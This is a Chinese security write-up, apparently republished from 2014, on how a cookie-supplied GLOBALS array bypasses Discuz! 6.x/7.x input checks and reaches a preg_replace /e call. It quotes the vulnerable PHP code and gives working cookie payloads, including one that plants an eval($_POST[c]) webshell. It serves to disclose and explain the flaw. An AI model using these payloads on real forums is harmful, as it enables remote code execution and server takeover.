# Discuz! 6.x/7.x 全局变量防御绕过导致命令执行

阅读量 **203782**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2014-11-26 10:42:29

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全脉搏

原文地址：<http://www.secpulse.com/archives/2338.html>

译文仅供参考，具体内容表达以及含义原文为准。

## 漏洞概述：

由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。

## 漏洞分析：

    
    
    include/global.func.php代码里：
    function daddslashes($string, $force = 0) {
        !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
        if(!MAGIC_QUOTES_GPC || $force) {
            if(is_array($string)) {
                foreach($string as $key => $val) {
                    $string[$key] = daddslashes($val, $force);
                }
            } else {
                $string = addslashes($string);
            }
        }
        return $string;
    }
    include/common.inc.php里：
    foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
        foreach($$_request as $_key => $_value) {
            $_key{0} != '_' && $$_key = daddslashes($_value);
        }
    }

模拟register_globals功能的代码,在GPC为off时会调用addslashes()函数处理变量值,但是如果直接使  
用$_GET/$_POST/$_COOKIE这样的变量,这个就不起作用了,然而dz的源码里直接使用$_GET/$_POST/$_COOKIE的地  
方很少,存在漏洞的地方更加少:(

不过还有其他的绕过方法,在register_globals=on下通过提交GLOBALS变量就可以绕过上面的代码了.为了防止这种情况,dz中有如下代码:

    
    
    if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
        exit('Request tainting attempted.');
    }

这样就没法提交GLOBALS变量了么？

$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列  
中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我  
们就可以通过COOKIE来提交GLOBALS变量了:)

## 漏洞利用

## include/discuzcode.func.php

    
    
    function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode =
    1, $allowhtml = 0, $jammer = 0, $parsetype = '0', $authorid = '0', $allowmediacode = '0', $pid = 0) {
    global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowat
    tachurl;
    if($parsetype != 1 && !$bbcodeoff && $allowbbcode && (strpos($message, '[/code]') || strpos($message, '[/CODE]')
    ) !== FALSE) {
    $message = preg_replace("/s?[code](.+?)[/code]s?/ies", "codedisp('\1')", $message);
    }
    $msglower = strtolower($message);
    //$htmlon = $htmlon && $allowhtml ? 1 : 0;
    if(!$htmlon) {
    $message = $jammer ? preg_replace("/rn|n|r/e", "jammer()", dhtmlspecialchars($message)) : dhtmlspeci
    alchars($message);
    }
    if(!$smileyoff && $allowsmilies && !empty($GLOBALS['_DCACHE']['smilies']) && is_array($GLOBALS['_DCACHE']['smili
    es'])) {
    if(!$discuzcodes['smiliesreplaced']) {
    foreach($GLOBALS['_DCACHE']['smilies']['replacearray'] AS $key => $smiley) {
    $GLOBALS['_DCACHE']['smilies']['replacearray'][$key] = '<img src="images/smilies/'.$GLOB
    ALS['_DCACHE']['smileytypes'][$GLOBALS['_DCACHE']['smilies']['typearray'][$key]]['directory'].'/'.$smiley.'" smilieid="'
    .$key.'" border="0" alt="" />';
    }
    $discuzcodes['smiliesreplaced'] = 1;
    }
    $message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['r
    eplacearray'], $message, $maxsmilies);
    }

注意到：

    
    
    $message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], 
    $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);

请求中Cookie带

GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;
GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();  
即可执行phpinfo。  
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;
GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[c])%3B;  
即一句话木马。

此后门漏洞十分隐蔽，不容易发现。

## 利用条件：

1.discuz 6.x / 7.x

2.request_order默认值为GP

## 参考地址：

http://www.80vul.com/dzvul/sodb/19/sodb-2010-01.txt

Discuz!某两个版本前台产品命令执行（无需登录）

http://www.wooyun.org/bugs/wooyun-2010-080723

本文翻译自安全脉搏 [原文链接](http://www.secpulse.com/archives/2338.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82316](/post/id/82316)

安全客 - 有思想的安全新媒体

本文转载自: [安全脉搏](http://www.secpulse.com/archives/2338.html)

如若转载,请注明出处： <http://www.secpulse.com/archives/2338.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

